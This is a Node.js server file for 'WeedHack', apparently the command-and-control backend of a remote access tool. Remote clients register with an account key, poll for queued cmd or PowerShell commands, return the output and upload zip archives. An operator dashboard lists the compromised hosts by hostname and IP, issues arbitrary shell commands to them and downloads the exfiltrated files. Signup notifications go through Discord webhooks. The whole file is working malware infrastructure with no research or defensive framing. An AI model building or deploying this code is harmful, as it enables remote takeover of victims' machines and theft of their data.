// language: JavaScript, file: server.js, target: Node 22.5+
// weedhack — express + tcp + udp. env-driven ports. node:sqlite.
import 'dotenv/config';
import express from 'express';
import helmet from 'helmet';
import cookieParser from 'cookie-parser';
import rateLimit from 'express-rate-limit';
import bcrypt from 'bcryptjs';
import jwt from 'jsonwebtoken';
import crypto from 'node:crypto';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import db, { UPLOAD_DIR } from './db.js';
import { startTcp, startUdp } from './net.js';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express();

const HTTP_PORT = Number(process.env.HTTP_PORT || process.env.PORT || 3000);
const TCP_PORT  = Number(process.env.TCP_PORT  || 4000);
const UDP_PORT  = Number(process.env.UDP_PORT  || 4001);
const BIND_HOST = process.env.BIND_HOST || '0.0.0.0';
const JWT_SECRET = process.env.JWT_SECRET || 'dev_only_change_me';
const COOKIE_SECURE = process.env.COOKIE_SECURE === 'true';
const MAX_UPLOAD = Number(process.env.MAX_UPLOAD_BYTES || 64 * 1024 * 1024); // 64 MB

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc:  ["'self'"],
      styleSrc:   ["'self'", "'unsafe-inline'"],
      imgSrc:     ["'self'", 'data:'],
      connectSrc: ["'self'"],
      frameAncestors: ["'none'"],
      objectSrc:  ["'none'"],
      baseUri:    ["'self'"]
    }
  },
  crossOriginResourcePolicy: { policy: 'same-origin' },
  referrerPolicy: { policy: 'no-referrer' }
}));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));

// raw body for zip uploads — bound BEFORE the json parser for that route only
app.use('/api/client/upload', express.raw({
  type: ['application/zip', 'application/octet-stream'],
  limit: MAX_UPLOAD
}));

app.use(express.json({ limit: '64kb' }));

// ---- sql guard: no template interpolation, values bind via ? only ----
function sql(strings, ...vals) {
  if (vals.length) throw new Error('sql tagged template refused — use ? params');
  return strings[0];
}

// ---- rate limiters ----
const globalLimiter = rateLimit({
  windowMs: 60_000, max: 120, standardHeaders: true, legacyHeaders: false,
  message: { error: 'too many requests' }
});
const authLimiter = rateLimit({
  windowMs: 15 * 60_000, max: 10, standardHeaders: true, legacyHeaders: false,
  message: { error: 'too many attempts, slow down' }
});
const webhookLimiter = rateLimit({
  windowMs: 60 * 60_000, max: 5, standardHeaders: true, legacyHeaders: false,
  message: { error: 'webhook test limit reached' }
});
const clientLimiter = rateLimit({
  windowMs: 60_000, max: 600, standardHeaders: true, legacyHeaders: false,
  message: { error: 'too many client requests' }
});
const uploadLimiter = rateLimit({
  windowMs: 60 * 60_000, max: 10, standardHeaders: true, legacyHeaders: false,
  message: { error: 'upload limit reached — max 10 per hour' }
});
const downloadLimiter = rateLimit({
  windowMs: 60_000, max: 30, standardHeaders: true, legacyHeaders: false,
  message: { error: 'too many downloads' }
});
app.use(globalLimiter);

// ---- helpers ----
function genKey() {
  const A = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
  const block = () => Array.from({ length: 4 }, () => A[crypto.randomInt(A.length)]).join('');
  return [block(), block(), block(), block()].join('-');
}

function signToken(user) {
  return jwt.sign({ uid: user.id, username: user.username }, JWT_SECRET, { expiresIn: '7d' });
}

function cookieOpts() {
  return { httpOnly: true, sameSite: 'lax', secure: COOKIE_SECURE, maxAge: 7 * 24 * 3600 * 1000 };
}

function auth(req, res, next) {
  const token = req.cookies?.token;
  if (!token) return res.status(401).json({ error: 'unauthorized' });
  try { req.user = jwt.verify(token, JWT_SECRET); next(); }
  catch { return res.status(401).json({ error: 'unauthorized' }); }
}

function isDiscordWebhook(url) {
  return typeof url === 'string' &&
    /^https:\/\/(discord|discordapp)\.com\/api\/webhooks\/\d+\/[\w-]+$/.test(url);
}

async function sendWebhook(url, payload) {
  const r = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username: 'WeedHack', ...payload }),
    redirect: 'error',
    signal: AbortSignal.timeout(5000)
  });
  return r.ok;
}

function getOwnUser(uid) {
  return db.prepare(sql`
    SELECT id, username, email, account_key, discord_webhook, created_at
    FROM users WHERE id = ?
  `).get(uid);
}

// ---- auth routes ----
app.post('/api/signup', authLimiter, async (req, res) => {
  const { username, email, password, discordWebhook } = req.body || {};
  if (!username || !email || !password || !discordWebhook)
    return res.status(400).json({ error: 'all fields required' });
  if (username.length < 3 || username.length > 32)
    return res.status(400).json({ error: 'username 3-32 chars' });
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email))
    return res.status(400).json({ error: 'invalid email' });
  if (password.length < 8)
    return res.status(400).json({ error: 'password min 8 chars' });
  if (!isDiscordWebhook(discordWebhook))
    return res.status(400).json({ error: 'invalid discord webhook url' });

  const exists = db.prepare(sql`SELECT id FROM users WHERE username = ? OR email = ?`).get(username, email);
  if (exists) return res.status(409).json({ error: 'username or email taken' });

  let webhookOk = false;
  try {
    webhookOk = await sendWebhook(discordWebhook, {
      content: `webhook verified for \`${username}\``,
      embeds: [{
        title: 'account verified',
        color: 0x2E7D32,
        description: 'your webhook is live. your account key arrives next.',
        timestamp: new Date().toISOString()
      }]
    });
  } catch { webhookOk = false; }
  if (!webhookOk) return res.status(400).json({ error: 'webhook unreachable — check the url' });

  const hash = await bcrypt.hash(password, 12);
  const accountKey = genKey();

  const info = db.prepare(sql`
    INSERT INTO users (username, email, password_hash, account_key, discord_webhook, created_at)
    VALUES (?, ?, ?, ?, ?, ?)
  `).run(username, email, hash, accountKey, discordWebhook, Date.now());

  const user = { id: Number(info.lastInsertRowid), username };

  sendWebhook(discordWebhook, {
    content: `account key for **${username}**`,
    embeds: [{
      title: 'your account key',
      color: 0x6B0F2B,
      description: `\`\`\`\n${accountKey}\n\`\`\`\nsave this. shown once on screen too.`,
      timestamp: new Date().toISOString()
    }]
  }).catch(() => {});

  res.cookie('token', signToken(user), cookieOpts());
  res.json({ ok: true, accountKey, username });
});

app.post('/api/signin', authLimiter, async (req, res) => {
  const { username, password } = req.body || {};
  if (!username || !password) return res.status(400).json({ error: 'missing fields' });
  const user = db.prepare(sql`SELECT * FROM users WHERE username = ? OR email = ?`).get(username, username);
  if (!user) return res.status(401).json({ error: 'invalid credentials' });
  const ok = await bcrypt.compare(password, user.password_hash);
  if (!ok) return res.status(401).json({ error: 'invalid credentials' });
  res.cookie('token', signToken({ id: user.id, username: user.username }), cookieOpts());
  res.json({ ok: true, username: user.username });
});

app.post('/api/logout', (req, res) => { res.clearCookie('token'); res.json({ ok: true }); });

app.get('/api/me', auth, (req, res) => {
  const row = getOwnUser(req.user.uid);
  if (!row) return res.status(404).json({ error: 'not found' });
  res.json({
    username: row.username,
    email: row.email,
    accountKey: row.account_key,
    discordWebhook: row.discord_webhook,
    createdAt: row.created_at
  });
});

app.post('/api/webhook/test', auth, webhookLimiter, async (req, res) => {
  const { url } = req.body || {};
  if (!isDiscordWebhook(url)) return res.status(400).json({ error: 'invalid discord webhook url' });
  try {
    const ok = await sendWebhook(url, {
      content: 'webhook test',
      embeds: [{ title: 'connection live', color: 0x2E7D32, timestamp: new Date().toISOString() }]
    });
    if (!ok) return res.status(502).json({ error: 'webhook rejected the payload' });
    db.prepare(sql`UPDATE users SET discord_webhook = ? WHERE id = ?`).run(url, req.user.uid);
    res.json({ ok: true });
  } catch { res.status(502).json({ error: 'webhook unreachable' }); }
});

// ---- client-facing endpoints (auth by account key, not cookie) ----
function authByKey(req, res, next) {
  // key can arrive as JSON body (most routes) or query (upload/download)
  const key = (req.body && req.body.key) || req.query.key;
  if (!key) return res.status(401).json({ error: 'missing key' });
  const user = db.prepare(sql`SELECT id, username FROM users WHERE account_key = ?`).get(key);
  if (!user) return res.status(401).json({ error: 'invalid key' });
  req.keyUser = user;
  next();
}

app.post('/api/client/register', clientLimiter, authByKey, (req, res) => {
  const { hostname } = req.body || {};
  const ip = req.ip || '';
  const uid = req.keyUser.id;

  const existing = db.prepare(sql`
    SELECT id FROM clients WHERE user_id = ? AND hostname = ?
  `).get(uid, hostname || 'unknown');

  if (existing) {
    db.prepare(sql`UPDATE clients SET ip = ?, last_seen = ? WHERE id = ?`)
      .run(ip, Date.now(), existing.id);
    return res.json({ ok: true, clientId: existing.id });
  }

  const info = db.prepare(sql`
    INSERT INTO clients (user_id, key, hostname, ip, last_seen)
    VALUES (?, ?, ?, ?, ?)
  `).run(uid, req.body.key, hostname || 'unknown', ip, Date.now());
  res.json({ ok: true, clientId: Number(info.lastInsertRowid) });
});

app.post('/api/client/pull', clientLimiter, authByKey, (req, res) => {
  const uid = req.keyUser.id;
  const ip = req.ip || '';
  const client = db.prepare(sql`
    SELECT id FROM clients WHERE user_id = ? AND ip = ?
    ORDER BY last_seen DESC LIMIT 1
  `).get(uid, ip);
  if (client) {
    db.prepare(sql`UPDATE clients SET last_seen = ? WHERE id = ?`).run(Date.now(), client.id);
  }

  const cmd = db.prepare(sql`
    SELECT id, shell, line FROM commands
    WHERE user_id = ? AND status = 'pending'
    ORDER BY created_at ASC LIMIT 1
  `).get(uid);
  if (!cmd) return res.json({ id: null });

  db.prepare(sql`UPDATE commands SET status = 'sent' WHERE id = ?`).run(cmd.id);
  res.json({ id: Number(cmd.id), shell: cmd.shell, line: cmd.line });
});

app.post('/api/client/result', clientLimiter, authByKey, (req, res) => {
  const { id, output } = req.body || {};
  if (!id) return res.status(400).json({ error: 'missing id' });
  const uid = req.keyUser.id;
  const info = db.prepare(sql`
    UPDATE commands SET output = ?, status = 'done'
    WHERE id = ? AND user_id = ?
  `).run(String(output || '').slice(0, 65536), id, uid);
  if (info.changes === 0) return res.status(404).json({ error: 'command not found' });
  res.json({ ok: true });
});

// ---- zip upload from client ----
app.post('/api/client/upload', uploadLimiter, authByKey, (req, res) => {
  const uid = req.keyUser.id;
  const ip = req.ip || '';
  const filename = String(req.query.name || 'upload.zip').slice(0, 128).replace(/[^\w.\-]/g, '_');

  if (!Buffer.isBuffer(req.body) || req.body.length === 0)
    return res.status(400).json({ error: 'empty body' });
  if (req.body.length > MAX_UPLOAD)
    return res.status(413).json({ error: 'file too large' });
  // quick zip magic check: PK\x03\x04
  const magic = req.body.slice(0, 4);
  if (!(magic[0] === 0x50 && magic[1] === 0x4B))
    return res.status(400).json({ error: 'not a zip file' });

  const client = db.prepare(sql`
    SELECT id FROM clients WHERE user_id = ? AND ip = ?
    ORDER BY last_seen DESC LIMIT 1
  `).get(uid, ip);
  if (!client) return res.status(400).json({ error: 'client not registered' });

  const storedName = `${crypto.randomUUID()}.zip`;
  const dest = path.join(UPLOAD_DIR, storedName);
  try { fs.writeFileSync(dest, req.body, { mode: 0o600 }); }
  catch (e) { return res.status(500).json({ error: 'write failed' }); }

  const info = db.prepare(sql`
    INSERT INTO uploads (user_id, client_id, filename, stored_name, size, created_at)
    VALUES (?, ?, ?, ?, ?, ?)
  `).run(uid, client.id, filename, storedName, req.body.length, Date.now());

  res.json({
    ok: true,
    uploadId: Number(info.lastInsertRowid),
    filename,
    size: req.body.length
  });
});

// ---- dashboard: list uploads for a client ----
app.get('/api/clients/:id/uploads', auth, (req, res) => {
  const clientId = Number(req.params.id);
  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(clientId, req.user.uid);
  if (!client) return res.status(404).json({ error: 'client not found' });
  const rows = db.prepare(sql`
    SELECT id, filename, size, created_at FROM uploads
    WHERE user_id = ? AND client_id = ?
    ORDER BY created_at DESC LIMIT 200
  `).all(req.user.uid, clientId);
  res.json(rows);
});

// ---- dashboard: download a specific upload ----
app.get('/api/uploads/:id/download', downloadLimiter, auth, (req, res) => {
  const uploadId = Number(req.params.id);
  const row = db.prepare(sql`
    SELECT filename, stored_name, size FROM uploads
    WHERE id = ? AND user_id = ?
  `).get(uploadId, req.user.uid);
  if (!row) return res.status(404).json({ error: 'not found' });

  const src = path.join(UPLOAD_DIR, row.stored_name);
  if (!fs.existsSync(src)) return res.status(410).json({ error: 'file gone' });

  res.setHeader('Content-Type', 'application/zip');
  res.setHeader('Content-Length', row.size);
  res.setHeader('Content-Disposition',
    `attachment; filename="${row.filename.replace(/"/g, '')}"`);
  fs.createReadStream(src).pipe(res);
});

// ---- dashboard: dashboard-facing client endpoints ----
app.get('/api/clients', auth, (req, res) => {
  const rows = db.prepare(sql`
    SELECT id, hostname, ip, last_seen FROM clients
    WHERE user_id = ? ORDER BY last_seen DESC
  `).all(req.user.uid);
  const now = Date.now();
  res.json(rows.map(r => ({
    id: r.id,
    hostname: r.hostname,
    ip: r.ip,
    online: now - r.last_seen < 30_000,
    lastSeen: r.last_seen
  })));
});

app.post('/api/clients/:id/exec', auth, (req, res) => {
  const clientId = Number(req.params.id);
  const { shell, line } = req.body || {};
  if (!['cmd', 'powershell'].includes(shell)) return res.status(400).json({ error: 'bad shell' });
  if (typeof line !== 'string' || !line.trim() || line.length > 4096)
    return res.status(400).json({ error: 'bad line' });

  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(clientId, req.user.uid);
  if (!client) return res.status(404).json({ error: 'client not found' });

  const info = db.prepare(sql`
    INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
    VALUES (?, ?, ?, ?, 'pending', ?)
  `).run(req.user.uid, clientId, shell, line, Date.now());

  res.json({ ok: true, commandId: Number(info.lastInsertRowid) });
});

app.get('/api/clients/:id/commands', auth, (req, res) => {
  const clientId = Number(req.params.id);
  const rows = db.prepare(sql`
    SELECT id, shell, line, output, status, created_at FROM commands
    WHERE user_id = ? AND client_id = ?
    ORDER BY created_at DESC LIMIT 100
  `).all(req.user.uid, clientId);
  res.json(rows);
});

app.use((err, req, res, next) => { console.error(err); res.status(500).json({ error: 'server error' }); });

// ---- listeners ----
let udpBound = false;

const tcpServer = startTcp({
  host: BIND_HOST,
  port: TCP_PORT,
  onConn: (sock) => { sock.write('weedhack tcp ready\n'); },
  onLine: (line, sock) => {
    if (line === 'ping') sock.write('pong\n');
    else if (line === 'who') sock.write(`you ${sock.remoteAddress}:${sock.remotePort}\n`);
    else sock.write(`echo: ${line}\n`);
  }
});

const udpSock = startUdp({
  host: BIND_HOST,
  port: UDP_PORT,
  onMsg: (text, rinfo, s) => {
    const reply = Buffer.from(`weedhack: ${text}`);
    s.send(reply, rinfo.port, rinfo.address, () => {});
  }
});
udpSock.on('listening', () => { udpBound = true; });

app.listen(HTTP_PORT, BIND_HOST, () => {
  console.log(`WeedHack http up on ${BIND_HOST}:${HTTP_PORT}`);
  console.log(`WeedHack tcp  on ${BIND_HOST}:${TCP_PORT}`);
  console.log(`WeedHack udp  on ${BIND_HOST}:${UDP_PORT}`);
});